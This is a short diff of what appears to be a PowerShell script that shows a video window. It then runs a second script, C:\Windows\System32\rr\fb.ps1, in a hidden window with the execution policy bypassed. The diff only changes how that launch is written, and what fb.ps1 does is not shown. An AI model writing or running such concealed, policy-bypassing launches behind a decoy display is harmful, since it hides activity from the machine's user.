@@ -32,4 +32,4 @@ $VideoPlayer.Play()
 #Show Up the Window 
 $Window.ShowDialog() | out-null
 
-Start-Process -FilePath "powershell.exe" -ArgumentList "-w h -Exec Bypass '& C:\Windows\System32\rr\fb.ps1'"
+powershell -w h -Exec Bypass C:\Windows\System32\rr\fb.ps1
